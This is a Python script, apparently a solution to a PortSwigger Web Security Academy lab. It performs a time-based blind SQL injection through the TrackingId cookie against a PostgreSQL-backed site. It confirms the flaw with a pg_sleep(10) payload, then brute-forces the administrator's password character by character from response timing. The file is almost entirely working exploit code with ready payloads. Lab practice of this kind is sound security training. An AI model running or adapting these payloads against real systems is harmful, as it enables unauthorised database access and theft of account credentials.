import requests
from pwn import * 
import time

#Cookie: TrackingId=cUnp1Gkl2HtZ4Jyi; session=dkPDdDnDrJzIT2wJYQGR2CYgbeWn2sMh
host='0ac000cd044ff97b81f517a000d70092.web-security-academy.net'
letters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
session='tKnlc10JAbJjsaPI8nSBEBCkq167uWUH'
id='UPjejKHSEADdIxhW'

url_main=f'https://{host}'
url_request=f'{url_main}/filter?category=Pets'

#payload = "cUnp1Gkl2HtZ4Jyi' AND (SELECT SUBSTR(schema_name,1,1) FROM information_schema.schemata='u')"

def ctrl_C(signal, frame):
    print('[+] exit')
    exit(1)

def valid_sql_injection():
    payload = "%s' ||(select 1 from pg_sleep(10))--" % (id)
    return send_request(payload)


def get_name_credentials(letters):
    if valid_sql_injection():
        p1=log.progress('Brute Force sleep to 10s')
        p2=log.progress('Password')
        password=''
        for start in range(1,21):
            for word in letters:
                #select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
                payload = "%s' ||(select case when substring(password,%d,1)='%s' then pg_sleep(10) else pg_sleep(0) end from users where username='administrator' limit 1)--" %(id,start,word)
                p1.status("%s" % payload)
                if send_request(payload):
                    password+=word
                    p2.status('%s' % (password))
                    break
                p2.status('%s' % (password))
    else:
        print('[+] Error, sql injection not found ')

        
def send_request(payload):
    
    cookies = {
          'TrackingId': payload,
          'session': session
          }
        #Cookie': TrackingId=UPjejKHSEADdIxhW'||(select case when substring(password,1,1)='fuzz' then pg_sleep(5) else pg_sleep(0) end from table_name where username='administrator' limit 1)--; session=tKnlc10JAbJjsaPI8nSBEBCkq167uWUH
    headers = {
        'Host': host,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'es-ES,es;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Dnt': '1',
        'Referer': url_request,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Te': 'trailers'


          }
    
    time_start=time.time()

    response = requests.get(url_request, cookies=cookies,headers=headers)

    time_end=time.time()

    if time_end - time_start>10:
        return True
    else:
        return False
    #print(f"An error occurred: {e}")


if __name__ == "__main__":
    signal.signal(signal.SIGINT,ctrl_C)
    #print(valid_sql_injection())
    get_name_credentials(letters)